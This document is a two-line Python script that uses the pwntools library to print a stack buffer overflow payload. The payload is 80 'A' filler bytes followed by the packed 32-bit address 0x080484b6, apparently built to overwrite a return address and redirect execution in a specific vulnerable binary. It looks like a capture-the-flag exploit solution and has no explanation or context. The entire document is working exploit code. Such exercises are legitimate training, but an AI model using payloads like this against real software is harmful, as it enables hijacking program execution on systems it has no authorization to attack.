from pwn import *
print(b"A"*80 + p32(0x080484b6))
